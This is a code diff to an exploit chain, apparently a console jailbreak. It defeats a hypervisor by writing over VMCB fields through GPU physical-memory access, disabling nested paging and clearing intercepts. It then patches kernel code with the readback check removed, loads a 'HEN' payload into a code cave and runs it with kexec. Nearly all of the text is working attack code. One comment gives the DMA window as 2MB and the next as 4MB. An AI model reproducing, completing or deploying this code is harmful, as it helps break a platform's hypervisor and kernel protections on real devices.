@@ -164,6 +164,14 @@ int stage3_patch_vmcbs(hv_defeat_ctx *ctx) {
     if (ctx->vmcb_count == 0) return -1;
 
     uint32_t np0 = gpu_read_phys4(ctx->vmcb_pas[0] + VMCB_NP_ENABLE);
+
+    if( np0 == 0x0 )
+    {
+        notify("Hypervisor already disabled, aborting..");
+
+        return -3;
+    }
+
     if (np0 != 0x9) {
         std::print("  vmcb[0] np=0x{:x}, expected 0x9 - aborting\n", np0);
         return -2;
@@ -175,19 +183,23 @@ int stage3_patch_vmcbs(hv_defeat_ctx *ctx) {
     for (int i = 0; i < ctx->vmcb_count; i++) {
 
         uint64_t pa = ctx->vmcb_pas[i];
-        //uint32_t g1 = gpu_read_phys4(pa + VMCB_INTERCEPT_MISC);
-        //uint32_t g2 = gpu_read_phys4(pa + VMCB_INTERCEPT_VMXX);
 
-        gpu_write_phys4(pa + VMCB_NP_ENABLE, 0 );
-        gpu_write_phys4(pa + VMCB_INTERCEPT_CR, 0);
-        gpu_write_phys4(pa + VMCB_INTERCEPT_EXC, 0); // exception bitmap cleared
-        gpu_write_phys4(pa + VMCB_INTERCEPT_MISC, (1u << 18));  // keep CPUID
-        gpu_write_phys4(pa + VMCB_INTERCEPT_VMXX, 0xF);         // 0xF not 0x3
-        gpu_write_phys4(pa + VMCB_TLB_CONTROL, 1);                          
-        gpu_write_phys4(pa + VMCB_VMCB_CLEAN, 0);                          
+        // read-modify-write: one GPU read, patch fields, one GPU write
+        vmcb_control_patch ctl;
+        gpu_read_phys(pa, &ctl, sizeof(ctl));
 
-        usleep(1000); 
+        ctl.np_enable      = 0;
+        ctl.intercept_cr   = 0;
+        ctl.intercept_exc  = 0;              // exception bitmap cleared
+        ctl.intercept_misc = (1u << 18);     // keep CPUID
+        ctl.intercept_vmxx = 0xF;            // VMSAVE/VMLOAD/VMMCALL/VMRUN
+        ctl.tlb_control    = 1;              // flush TLB on VMRUN
+        //ctl.vmcb_clean     = 0;              // nothing clean
+
+        gpu_write_phys(pa, &ctl, sizeof(ctl));
+
         std::print("  vmcb[{:2d}] patched\n", i);
+        usleep(1000);
     }
 
     for (int i = 0; i < 16; i++) {
@@ -197,7 +209,7 @@ int stage3_patch_vmcbs(hv_defeat_ctx *ctx) {
         }
     }
     usleep(200000);
-    unpin();
+    pin_to_core( 9 );
 
     ctx->vmcbs_patched = 1;
     std::print("  done, {} cores\n", ctx->vmcb_count);
@@ -337,24 +349,16 @@ int stage5_patch_kernel(hv_defeat_ctx *ctx) {
         return 0;
     }
 
-    int n = 0, verified = 0;
+    int n = 0;
     for (auto &p : pit->second) {
         uint64_t va = ktext + p.offset;
         uint64_t pa = pmap_kextract(va);
         if (pa && pa < 0x100000000ULL) {
             gpu_write_phys(pa, p.bytes, p.len);
-            uint8_t readback[16] = {};
-            if (p.len <= sizeof(readback)) {
-                gpu_read_phys(pa, readback, p.len);
-                if (memcmp(readback, p.bytes, p.len) == 0)
-                    verified++;
-                else
-                    std::print("  {} @ 0x{:x} MISMATCH\n", p.name, p.offset);
-            }
             n++;
         }
     }
-    std::print("  {} patches applied, {}/{} verified\n", n, verified, n);
+    std::print("  {} patches applied\n", n);
 
     return 0;
 }
@@ -421,14 +425,28 @@ int stage7_run_hen(hv_defeat_ctx *ctx) {
         std::print("  bad code cave PA\n");
         return -1;
     }
-    for (uint64_t i = 0; i < sz; i += 0x1000) {
-        uint32_t chunk = (i + 0x1000 <= sz) ? 0x1000 : (uint32_t)(sz - i);
-        gpu_write_phys(dest_pa + i, &KELF[i], chunk);
+
+    // HEN binary fits in single 2MB GPU DMA window
+    // Only chunk if the range crosses alignment boundary
+    // Make sure that HEN fits into this 4MB window!!!
+
+    constexpr uint64_t GPU_WINDOW = 2 * 0x100000;
+    uint64_t window_end = (dest_pa & ~(GPU_WINDOW - 1)) + GPU_WINDOW;
+    uint64_t first_chunk = window_end - dest_pa;
+
+    if (first_chunk >= sz) {
+        gpu_write_phys(dest_pa, KELF, (uint32_t)sz);
+    } else {
+        gpu_write_phys(dest_pa, KELF, (uint32_t)first_chunk);
+        gpu_write_phys(dest_pa + first_chunk, &KELF[first_chunk],
+                       (uint32_t)(sz - first_chunk));
     }
 
     usleep(100000);
 
     std::print("  copied {} bytes to 0x{:x}\n", sz, dest);
+
+    pin_to_core( 9 );
 
     int ret = kexec(dest);
     std::print("  kexec returned 0x{:x}\n", ret);
